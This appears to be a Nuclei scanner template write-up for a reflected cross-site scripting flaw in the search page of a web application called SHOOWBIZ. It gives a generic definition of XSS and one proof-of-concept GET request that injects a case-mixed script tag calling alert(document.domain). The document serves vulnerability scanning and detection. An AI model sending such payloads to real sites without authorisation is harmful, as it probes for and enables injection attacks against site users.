# Nuclei Template: SHOOWBIZ - Cross Site Scripting
**Template ID:** shoowbiz-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** Medium
**Source:** Nuclei Template (`shoowbiz-xss.yaml`)

## Vulnerability Information & PoC

## Description
Cross-Site Scripting, is a type of security vulnerability commonly found in web applications. It occurs when an attacker injects malicious scripts (typically written in JavaScript) into web pages viewed by other users.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/search.php?q=%3CScRipT%3Ealert(document.domain);%3C/ScRipT%3E
```

## References
- https://www.exploitalert.com/view-details.html?id=36000
